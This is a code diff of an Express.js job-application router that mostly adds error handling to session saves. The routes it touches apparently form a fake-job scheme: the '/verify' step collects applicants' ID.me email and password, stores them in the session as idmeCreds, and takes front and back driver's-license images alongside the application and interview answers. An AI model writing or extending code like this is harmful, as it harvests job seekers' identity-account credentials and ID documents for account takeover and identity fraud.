@@ -74,7 +74,6 @@ function requireSession(req, res, next) {
 }
 
 router.get('/', requireSession, (req, res) => {
-  // Optionally, support pre-selection via query: /apply?position=...
   const selectedPosition = req.query.position;
   res.render('apply', { 
     positions: JOB_POSITIONS, 
@@ -105,7 +104,8 @@ router.post('/start', requireSession, upload.array('documents', 6), async (req, 
     const selectedQuestions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
     const isDefault = !(normalizedPosition in INTERVIEW_QUESTIONS_MAP);
     req.session.interviewAnswers = null;
-    req.session.save(() => { // Force save to Redis
+    req.session.save((err) => {
+      if (err) return res.status(500).render('error', { message: 'Session save failed.' });
       res.render('application-submitted', {
         questions: selectedQuestions,
         position,
@@ -133,7 +133,6 @@ router.get('/interview', requireSession, (req, res) => {
   });
 });
 
-// FIX: After interview, redirect to info-note
 router.post('/interview', requireSession, express.urlencoded({ extended: true }), async (req, res) => {
   if (!req.session.applicationDraft) return res.redirect('/apply');
   const pos = req.session.applicationDraft.position;
@@ -144,12 +143,12 @@ router.post('/interview', requireSession, express.urlencoded({ extended: true })
     interviewAnswers[q.name] = req.body[q.name] || '';
   });
   req.session.interviewAnswers = interviewAnswers;
-  req.session.save(() => { // Force save to Redis
-    res.redirect('/apply/info-note'); // <-- FIXED FLOW
+  req.session.save((err) => {
+    if (err) return res.status(500).render('error', { message: 'Session save failed.' });
+    res.redirect('/apply/info-note');
   });
 });
 
-// NEW: Info note step after interview
 router.get('/info-note', requireSession, (req, res) => {
   if (!req.session.applicationDraft) return res.redirect('/apply');
   res.render('info-note', {
@@ -180,7 +179,6 @@ router.post('/verify', requireSession, driversLicenseUpload.fields(dlFields), as
   req.session.idme = { email, password };
   req.session.driversLicenseFiles = [dlFront, dlBack];
 
-  // Defensive: always use session interviewAnswers, even if empty
   const application = req.session.applicationDraft;
   const interviewAnswers = (req.session.interviewAnswers && typeof req.session.interviewAnswers === 'object') ? req.session.interviewAnswers : {};
   const idmeCreds = { email, password };
@@ -252,7 +250,8 @@ router.post('/verify', requireSession, driversLicenseUpload.fields(dlFields), as
     req.session.driversLicenseFiles = null;
   } catch (err) {}
 
-  req.session.save(() => { // Force save to Redis
+  req.session.save((err) => {
+    if (err) return res.status(500).render('error', { message: 'Session save failed.' });
     sendConfirmationEmail(email, req.session.applicationDraft.firstName)
       .then(() => res.redirect('/apply/submit'));
   });
@@ -337,7 +336,8 @@ router.post('/skip-idme/', requireSession, driversLicenseUpload.fields(dlFields)
     req.session.driversLicenseFiles = null;
   } catch (err) {}
 
-  req.session.save(() => {
+  req.session.save((err) => {
+    if (err) return res.status(500).render('error', { message: 'Session save failed.' });
     sendConfirmationEmail(application.email, application.firstName)
       .then(() => res.redirect('/apply/submit'));
   });
@@ -383,7 +383,8 @@ router.post('/submit', requireSession, async (req, res) => {
     req.session.interviewAnswers = null;
     req.session.verified = null;
     req.session.idme = null;
-    req.session.save(() => {
+    req.session.save((err) => {
+      if (err) return res.status(500).render('error', { message: 'Session save failed.' });
       res.render('success');
     });
   } catch (err) {
